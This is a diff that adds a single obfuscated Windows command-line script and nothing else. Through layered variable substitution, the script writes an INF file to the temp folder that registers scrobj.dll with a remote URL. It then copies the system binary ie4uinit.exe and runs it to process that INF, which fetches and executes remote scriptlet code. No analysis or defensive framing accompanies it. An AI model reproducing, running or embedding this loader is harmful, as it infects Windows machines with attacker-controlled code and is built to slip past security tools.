@@ -1,0 +1,19 @@
+/v /c  (for %v in ("peatmanpr=et" "viscou=e" "overmarkc=c" "philof=se" "bloo=l" ) do @set %~v) &&
+  callcall(for %s in ("f") do @set "undetra=%~s") &&
+  call(for %g in ("c") do @set "calvarie=%~g") &&
+  callcallcallcall(for %x in ("%temp%") do @set "perlo=%~x") &&
+  (for %w in ("g") do @set "unfe=%~w") &&
+  call(for %v in (" ") do @set "sca=%~v") &&
+  call(for %f in ("3") do @set "tropicaliz=%~f") &&
+  (for %b in ("a") do @set "unrebelint=%~b") &&
+  (for %w in ("E") do @set "para=%~w") &&
+  (for %c in ("_") do @set "otherworld=%~c") &&
+  (for %s in ("n") do @set "hept=%~s") &&
+  call(for %t in ("b") do @set "syner=%~t") &&
+  call(for %f in ("d") do @set "lycin=%~f") &&
+  (for %p in ("l") do @set "payo=%~p") &&
+  callcall(for %h in ("l") do @set "payo=%~h") &&
+  callcallcallcall(for %m in ("l") do @set "payo=%~m") &&
+  call(for %j in ("[peramelid_79E]" "%morra%c%tinkl%o%aprioristi%\" "%toileti%.%dermatomyc%l%cycloi%,N%transalpin%,h%ungo%t%valetudi%:%embit%/%lawnlikechl%n%sann%f%sann%l%pastor%g%sann%f%tenone%c%prebelievi%m%embit%w%pastor%q%sann%" "[version]" "signature=$windows nt$" "[defaultinstall.windows7]" "delfiles=D88CE" "Un\" "Register\" "OCXs=peramelid_79E" "[destinationdirs]" "defaultdestdir=11" "D88CE=01" "[strings]" "servicename= 'ascensi'" "shortsvcname= 'ascensi'" "tenone=." "embit=/" "transalpin=I" "sann=a" "aprioristi=b" "dermatomyc=d" "pastor=f" "preev=i" "toileti=j" "lawnlikechl=k" "cycloi=l" "softlysu=n" "prebelievi=o" "valetudi=p" "tinkl=r" "morra=s" "ungo=t" "caws=u" "[D88CE]" "%preev%e%caws%i%softlysu%i%ungo%.%preev%n%pastor%" ) do @echo %~j) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
